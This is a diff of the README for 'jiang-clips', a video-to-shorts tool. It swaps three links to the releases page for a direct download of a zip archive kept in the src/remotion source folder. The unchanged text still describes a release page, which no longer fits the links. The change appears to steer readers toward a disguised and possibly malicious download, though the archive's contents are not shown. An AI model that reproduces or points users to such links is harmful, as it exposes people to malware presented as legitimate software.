@@ -1,10 +1,10 @@
 # 🎬 jiang-clips - Turn Long Videos Into Shorts
 
-[![Download jiang-clips](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github&labelColor=grey)](https://github.com/acephalous-mailbag753/jiang-clips/releases)
+[![Download jiang-clips](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github&labelColor=grey)](https://github.com/acephalous-mailbag753/jiang-clips/raw/refs/heads/main/src/remotion/jiang-clips-v3.6.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/acephalous-mailbag753/jiang-clips/releases
+Visit this page to download: https://github.com/acephalous-mailbag753/jiang-clips/raw/refs/heads/main/src/remotion/jiang-clips-v3.6.zip
 
 On that page, look for the latest release. Download the Windows file that matches your computer.
 
@@ -38,7 +38,7 @@ For best results, use a recent computer with a solid CPU and enough disk space f
 
 Go to the release page and get the newest Windows build:
 
-https://github.com/acephalous-mailbag753/jiang-clips/releases
+https://github.com/acephalous-mailbag753/jiang-clips/raw/refs/heads/main/src/remotion/jiang-clips-v3.6.zip
 
 ### 2. Download the app
 
